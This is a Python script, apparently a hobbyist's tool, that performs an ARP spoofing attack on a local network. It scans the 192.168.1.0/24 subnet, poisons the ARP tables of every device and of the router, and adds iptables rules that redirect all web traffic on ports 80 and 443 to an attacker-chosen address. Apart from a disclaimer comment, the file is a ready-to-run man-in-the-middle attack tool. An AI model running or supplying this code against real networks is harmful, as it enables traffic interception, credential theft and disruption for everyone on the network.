#!/usr/bin/env python3


# --------------------
# created by Fattcat -
#     ARP Attack     -
# --------------------

# USAGE : python3 script.py -rt 192.168.1.123 -r_ip 192.168.1.1

# "-r_ip" or "--router_ip" for set IP address of WiFi Router.
# "-rt" or "--redirect_to" for set IP address on which will be all devices redirected.

# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# !! DONT USE THIS CODE FOR BAD IDEAS OR HACKING WITHOUT PERMISSION BY OWNER OF ROUTER !!
# !! ONLY U ARE RESPONSIBLE FOR ALL DAMAGES THAT HAVE BEEN MADE BY BAD USING THIS CODE !!
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

import scapy.all as scapy
import subprocess
import sys
import time
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def spoof_all(spoof_ip, gateway_ip):
    while True:
        devices = scapy.arping("192.168.1.0/24", verbose=False)[0]
        for device in devices:
            target_ip = device[1].psrc
            if target_ip != gateway_ip and target_ip != spoof_ip:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
        time.sleep(2)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

def setup_iptables(redirect_ip):
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", redirect_ip])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", redirect_ip])
    subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

def clear_iptables():
    subprocess.call(["iptables", "-t", "nat", "-F"])

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument("-r_ip", "--router_ip", required=True, help="IP address of the router (gateway)")
    parser.add_argument("-rt", "--redirect_to", required=True, help="IP address to redirect the traffic to")

    args = parser.parse_args()
    gateway_ip = args.router_ip
    redirect_ip = args.redirect_to

    try:
        print("[*] Setting up iptables...")
        setup_iptables(redirect_ip)
        print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
        spoof_all(redirect_ip, gateway_ip)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring the network...")
        devices = scapy.arping("192.168.1.0/24", verbose=False)[0]
        for device in devices:
            target_ip = device[1].psrc
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
        clear_iptables()
        print("[*] Network restored. Exiting...")
